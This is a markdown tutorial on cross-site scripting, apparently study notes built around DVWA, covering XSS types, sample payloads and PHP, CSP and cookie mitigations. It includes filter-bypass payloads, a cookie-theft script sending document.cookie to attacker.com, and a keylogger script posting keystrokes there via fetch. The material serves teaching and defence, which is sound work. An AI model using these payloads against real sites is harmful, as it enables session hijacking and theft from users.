# Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

---

## XSS Types

### Stored XSS (Persistent)

Malicious script is **permanently stored** on the target server (database, comment field, profile).

**Attack flow:**
```
1. Attacker submits: <script>alert('XSS')</script> in a comment field
2. Server stores the script in the database
3. Every user who views the page executes the script
```

**DVWA example:**
```
Name: <script>alert('Stored XSS')</script>
Message: test
```

### Reflected XSS (Non-Persistent)

Malicious script is **reflected off the server** via URL parameters or form input.

**Attack flow:**
```
1. Attacker crafts URL: http://site.com/search?q=<script>alert('XSS')</script>
2. Victim clicks the link
3. Server reflects the input in the response
4. Script executes in victim's browser
```

**DVWA example:**
```
http://localhost/DVWA/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>
```

### DOM-Based XSS

Script executes through client-side JavaScript manipulation of the DOM — no server involvement.

---

## XSS Payloads

### Basic

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Cookie Theft

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Keylogger

```html
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
```

### Filter Bypass

```html
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert('XSS')>
"><script>alert('XSS')</script>
```

---

## Impact of XSS

| Impact | Description |
|--------|-------------|
| Session hijacking | Steal cookies/session tokens |
| Credential theft | Fake login forms |
| Defacement | Modify page content |
| Keylogging | Capture keystrokes |
| Malware distribution | Redirect to malicious sites |
| CSRF chaining | Perform actions as the victim |

---

## Mitigation Strategies

### Input Validation

Reject or sanitize dangerous characters and patterns:

```php
$input = strip_tags($_GET['name']);
$input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

### Output Encoding

Encode data before rendering in HTML:

```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### Content Security Policy (CSP)

Restrict which scripts can execute:

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### HTTP-Only Cookies

Prevent JavaScript from accessing session cookies:

```php
setcookie("session", $value, ["httponly" => true, "secure" => true]);
```

### Additional Defenses

- Use modern frameworks with auto-escaping (React, Angular, Django templates)
- Implement X-XSS-Protection header (legacy browsers)
- Validate Content-Type headers
- Use SameSite cookie attribute

See [scenarios/xss-attack-mitigation.md](../scenarios/xss-attack-mitigation.md) for complete attack and fix scenarios.
